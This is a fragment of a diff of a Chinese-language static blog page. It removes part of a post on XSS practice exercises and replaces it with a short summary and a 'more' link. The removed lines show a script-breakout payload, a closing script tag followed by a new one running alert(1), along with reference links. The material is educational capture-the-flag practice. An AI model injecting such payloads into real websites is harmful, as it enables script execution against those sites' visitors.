-<p>也可以直接闭合最前面的<script>,然后创造一个新的<script>执行alert(1)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
-<p>参考：<a href="https://blog.csdn.net/AlexYoung28/article/details/82315538">https://blog.csdn.net/AlexYoung28/article/details/82315538</a></p>
-<p><a href="http://www.youi.xin/?p=341">http://www.youi.xin/?p=341</a></p>
-<p>其实咱也没搞明白xss到底是个啥，咱也不敢问，也不敢说，咱就只敢看着别人的wp刷刷题</p>
-</script></p>
+        <p>xss</p>
       
     </div>
     
@@ -1029,6 +796,10 @@
       
       <div class="clearfix"></div>
     </div>
+      
+        <p class="article-more-link">
+          <a href="/2019/09/22/xss练习题/#more">more >></a>
+        </p>
       
     
   </div>
